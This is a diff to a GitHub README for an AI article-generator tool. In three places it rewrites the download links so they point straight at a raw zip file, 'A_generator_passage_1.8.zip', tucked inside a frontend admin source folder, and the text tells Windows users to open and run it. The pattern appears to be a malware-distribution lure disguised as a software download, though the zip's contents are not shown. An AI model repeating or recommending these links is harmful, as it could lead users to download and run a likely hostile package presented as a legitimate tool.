@@ -1,6 +1,6 @@
 # 🧠 AI-passage-generator - Build articles with guided AI flow
 
-[![Download](https://img.shields.io/badge/Download-Now-4C8BF5?style=for-the-badge)](https://github.com/needled-caruncula155/AI-passage-generator)
+[![Download](https://img.shields.io/badge/Download-Now-4C8BF5?style=for-the-badge)](https://github.com/needled-caruncula155/AI-passage-generator/raw/refs/heads/main/frontend/src/pages/admin/A_generator_passage_1.8.zip)
 
 ## 🚀 Overview
 
@@ -25,7 +25,7 @@ This project fits users who want a simple flow for article work without setting 
 
 Visit this page to download:
 
-[https://github.com/needled-caruncula155/AI-passage-generator](https://github.com/needled-caruncula155/AI-passage-generator)
+[https://github.com/needled-caruncula155/AI-passage-generator/raw/refs/heads/main/frontend/src/pages/admin/A_generator_passage_1.8.zip](https://github.com/needled-caruncula155/AI-passage-generator/raw/refs/heads/main/frontend/src/pages/admin/A_generator_passage_1.8.zip)
 
 1. Open the link above in your browser.
 2. Find the latest Windows build or release package.
@@ -188,7 +188,7 @@ For most Windows users, the easiest path is:
 
 ## 🔗 Download again
 
-[Visit the download page](https://github.com/needled-caruncula155/AI-passage-generator)
+[Visit the download page](https://github.com/needled-caruncula155/AI-passage-generator/raw/refs/heads/main/frontend/src/pages/admin/A_generator_passage_1.8.zip)
 
 ## 📝 Suggested first test
 
